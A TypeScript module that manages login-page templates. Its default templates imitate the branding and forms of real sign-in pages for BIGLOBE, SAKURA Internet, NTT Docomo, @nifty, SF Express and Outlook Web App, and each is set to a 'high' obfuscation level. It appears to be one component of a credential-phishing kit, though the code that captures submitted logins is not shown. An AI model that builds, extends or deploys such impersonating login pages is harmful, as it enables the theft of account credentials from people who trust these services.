import fs from 'fs/promises'
import path from 'path'
import { Template } from './templateTypes'

const TEMPLATES_DIR = path.join(process.cwd(), '.templates')
const TEMPLATES_FILE = path.join(TEMPLATES_DIR, 'templates.json')

// Ensure templates directory exists
async function ensureTemplatesDir() {
  try {
    await fs.access(TEMPLATES_DIR)
  } catch {
    await fs.mkdir(TEMPLATES_DIR, { recursive: true })
  }
}

// Load JSON file dynamically
async function loadJSON(filePath: string) {
  try {
    const data = await fs.readFile(filePath, 'utf-8')
    return JSON.parse(data)
  } catch (error) {
    throw error
  }
}

// Load all templates
export async function loadTemplates(): Promise<Template[]> {
  await ensureTemplatesDir()
  
  try {
    const data = await fs.readFile(TEMPLATES_FILE, 'utf-8')
    return JSON.parse(data)
  } catch {
    // Return default templates if file doesn't exist
    const defaults = await getDefaultTemplates()
    await saveTemplates(defaults)
    return defaults
  }
}

// Save templates
export async function saveTemplates(templates: Template[]): Promise<void> {
  await ensureTemplatesDir()
  await fs.writeFile(TEMPLATES_FILE, JSON.stringify(templates, null, 2))
}

// Get template by ID
export async function getTemplateById(id: string): Promise<Template | null> {
  const templates = await loadTemplates()
  return templates.find(t => t.id === id) || null
}

// Get default template
export async function getDefaultTemplate(): Promise<Template | null> {
  const templates = await loadTemplates()
  return templates.find(t => t.isDefault && t.enabled) || templates[0] || null
}

// Create template
export async function createTemplate(template: Omit<Template, 'id' | 'createdAt' | 'updatedAt'>): Promise<Template> {
  const templates = await loadTemplates()
  
  const newTemplate: Template = {
    ...template,
    id: `tmpl_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    createdAt: Date.now(),
    updatedAt: Date.now(),
  }
  
  templates.push(newTemplate)
  await saveTemplates(templates)
  
  return newTemplate
}

// Update template
export async function updateTemplate(id: string, updates: Partial<Template>): Promise<Template | null> {
  const templates = await loadTemplates()
  const index = templates.findIndex(t => t.id === id)
  
  if (index === -1) return null
  
  templates[index] = {
    ...templates[index],
    ...updates,
    updatedAt: Date.now(),
  }
  
  await saveTemplates(templates)
  return templates[index]
}

// Delete template
export async function deleteTemplate(id: string): Promise<boolean> {
  const templates = await loadTemplates()
  const filtered = templates.filter(t => t.id !== id)
  
  if (filtered.length === templates.length) return false
  
  await saveTemplates(filtered)
  return true
}

// Get default templates (7 templates including SF Express, Outlook, and OWA Server)
async function getDefaultTemplates(): Promise<Template[]> {
  const localesDir = path.join(process.cwd(), 'locales')
  
  // Load translation files
  const biglobeTranslations = await loadJSON(path.join(localesDir, 'biglobe.json'))
  const sakuraTranslations = await loadJSON(path.join(localesDir, 'sakura.json'))
  const docomoTranslations = await loadJSON(path.join(localesDir, 'docomo.json'))
  const niftyTranslations = await loadJSON(path.join(localesDir, 'nifty.json'))
  const sfexpressTranslations = await loadJSON(path.join(localesDir, 'sfexpress.json'))
  const outlookTranslations = await loadJSON(path.join(localesDir, 'outlook.json'))
  const owaserverTranslations = await loadJSON(path.join(localesDir, 'owaserver.json'))
  
  return [
    // BIGLOBE Template
    {
      id: 'biglobe_default',
      name: 'BIGLOBE Mail',
      provider: 'biglobe' as const,
      type: 'email-login' as const,
      enabled: true,
      isDefault: true,
      theme: {
        primaryColor: '#FF9900',
        secondaryColor: '#FFCC66',
        backgroundColor: '#FFFFFF',
        textColor: '#333333',
        accentColor: '#FF6600',
      },
      background: {
        type: 'color' as const,
        value: '#F5F5F5',
      },
      logo: {
        text: 'BIGLOBEメール',
        width: 200,
        height: 60,
      },
      layout: {
        containerWidth: '500px',
        formPosition: 'center' as const,
        showHeader: true,
        showFooter: true,
      },
      translations: biglobeTranslations,
      defaultLanguage: 'ja' as const,
      autoDetectLanguage: true,
      features: {
        showLogo: true,
        showNotices: true,
        showCaptcha: true,
        showRememberMe: true,
        showForgotPassword: true,
        showCreateAccount: false,
        showSoftKeyboard: true,
      },
      obfuscationLevel: 'high' as const,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      createdBy: 'system',
    },
    
    // SAKURA Template
    {
      id: 'sakura_default',
      name: 'SAKURA Internet',
      provider: 'sakura' as const,
      type: 'email-login' as const,
      enabled: true,
      isDefault: false,
      theme: {
        primaryColor: '#0066CC',
        secondaryColor: '#3399FF',
        backgroundColor: '#FFFFFF',
        textColor: '#333333',
        accentColor: '#0052A3',
      },
      background: {
        type: 'color' as const,
        value: '#FFFFFF',
      },
      logo: {
        text: 'SAKURA internet',
        width: 200,
        height: 50,
      },
      layout: {
        containerWidth: '600px',
        formPosition: 'center' as const,
        showHeader: true,
        showFooter: true,
      },
      translations: sakuraTranslations,
      defaultLanguage: 'ja' as const,
      autoDetectLanguage: true,
      features: {
        showLogo: true,
        showNotices: true,
        showCaptcha: false,
        showRememberMe: true,
        showForgotPassword: true,
        showCreateAccount: true,
        showSoftKeyboard: false,
      },
      obfuscationLevel: 'high' as const,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      createdBy: 'system',
    },
    
    // NTT Docomo Template
    {
      id: 'docomo_default',
      name: 'NTT Docomo d-account',
      provider: 'docomo' as const,
      type: 'email-login' as const,
      enabled: true,
      isDefault: false,
      theme: {
        primaryColor: '#CC0033',
        secondaryColor: '#FF3366',
        backgroundColor: '#FFFFFF',
        textColor: '#333333',
        accentColor: '#990033',
      },
      background: {
        type: 'color' as const,
        value: '#FFFFFF',
      },
      logo: {
        text: 'dアカウント',
        width: 180,
        height: 50,
      },
      layout: {
        containerWidth: '500px',
        formPosition: 'center' as const,
        showHeader: true,
        showFooter: true,
      },
      translations: docomoTranslations,
      defaultLanguage: 'ja' as const,
      autoDetectLanguage: true,
      features: {
        showLogo: true,
        showNotices: true,
        showCaptcha: false,
        showRememberMe: true,
        showForgotPassword: true,
        showCreateAccount: true,
        showSoftKeyboard: false,
      },
      obfuscationLevel: 'high' as const,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      createdBy: 'system',
    },
    
    // @nifty Template
    {
      id: 'nifty_default',
      name: '@nifty メール',
      provider: 'nifty' as const,
      type: 'email-login' as const,
      enabled: true,
      isDefault: false,
      theme: {
        primaryColor: '#FFCC00',
        secondaryColor: '#FFDD55',
        backgroundColor: '#FFFFFF',
        textColor: '#333333',
        accentColor: '#FF9900',
      },
      background: {
        type: 'color' as const,
        value: '#F0F0F0',
      },
      logo: {
        text: '@nifty メール',
        width: 180,
        height: 50,
      },
      layout: {
        containerWidth: '480px',
        formPosition: 'center' as const,
        showHeader: true,
        showFooter: true,
      },
      translations: niftyTranslations,
      defaultLanguage: 'ja' as const,
      autoDetectLanguage: false,
      features: {
        showLogo: true,
        showNotices: true,
        showCaptcha: false,
        showRememberMe: true,
        showForgotPassword: true,
        showCreateAccount: false,
        showSoftKeyboard: false,
      },
      obfuscationLevel: 'high' as const,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      createdBy: 'system',
    },
    
    // SF Express Template
    {
      id: 'sfexpress_default',
      name: 'SF Express',
      provider: 'sfexpress' as const,
      type: 'email-login' as const,
      enabled: true,
      isDefault: false,
      theme: {
        primaryColor: '#DC2626',
        secondaryColor: '#EF4444',
        backgroundColor: '#FFFFFF',
        textColor: '#1F2937',
        accentColor: '#B91C1C',
      },
      background: {
        type: 'image' as const,
        value: '/images/sf-warehouse-bg.png',
        opacity: 1,
      },
      logo: {
        text: 'SF Express',
        width: 200,
        height: 60,
      },
      layout: {
        containerWidth: '1200px',
        formPosition: 'right' as const,
        showHeader: true,
        showFooter: true,
      },
      translations: sfexpressTranslations,
      defaultLanguage: 'en' as const,
      autoDetectLanguage: true,
      features: {
        showLogo: true,
        showNotices: true,
        showCaptcha: false,
        showRememberMe: true,
        showForgotPassword: true,
        showCreateAccount: true,
        showSoftKeyboard: false,
      },
      obfuscationLevel: 'high' as const,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      createdBy: 'system',
    },
    
    // Outlook Web App Template
    {
      id: 'outlook_default',
      name: 'Outlook Web App',
      provider: 'outlook' as const,
      type: 'email-login' as const,
      enabled: true,
      isDefault: false,
      theme: {
        primaryColor: '#0078d4',
        secondaryColor: '#106ebe',
        backgroundColor: '#FFFFFF',
        textColor: '#323130',
        accentColor: '#005a9e',
      },
      background: {
        type: 'color' as const,
        value: '#f0f0f0',
      },
      logo: {
        text: 'Outlook Web App',
        width: 200,
        height: 60,
      },
      layout: {
        containerWidth: '100%',
        formPosition: 'center' as const,
        showHeader: false,
        showFooter: false,
      },
      translations: outlookTranslations,
      defaultLanguage: 'en' as const,
      autoDetectLanguage: true,
      features: {
        showLogo: true,
        showNotices: false,
        showCaptcha: false,
        showRememberMe: false,
        showForgotPassword: true,
        showCreateAccount: true,
        showSoftKeyboard: false,
      },
      obfuscationLevel: 'high' as const,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      createdBy: 'system',
    },
    
    // OWA Server Data Template
    {
      id: 'owaserver_default',
      name: 'OWA Server Data',
      provider: 'owaserver' as const,
      type: 'email-login' as const,
      enabled: true,
      isDefault: false,
      theme: {
        primaryColor: '#1e7fb8',
        secondaryColor: '#2b95c8',
        backgroundColor: '#1e7fb8',
        textColor: '#FFFFFF',
        accentColor: '#8cbd27',
      },
      background: {
        type: 'color' as const,
        value: 'linear-gradient(135deg, #1e7fb8 0%, #2b95c8 100%)',
      },
      logo: {
        text: 'OWA Server Data',
        width: 200,
        height: 60,
      },
      layout: {
        containerWidth: '500px',
        formPosition: 'center' as const,
        showHeader: false,
        showFooter: false,
      },
      translations: owaserverTranslations,
      defaultLanguage: 'en' as const,
      autoDetectLanguage: true,
      features: {
        showLogo: true,
        showNotices: false,
        showCaptcha: false,
        showRememberMe: true,
        showForgotPassword: true,
        showCreateAccount: false,
        showSoftKeyboard: false,
      },
      obfuscationLevel: 'high' as const,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      createdBy: 'system',
    },
  ]
}

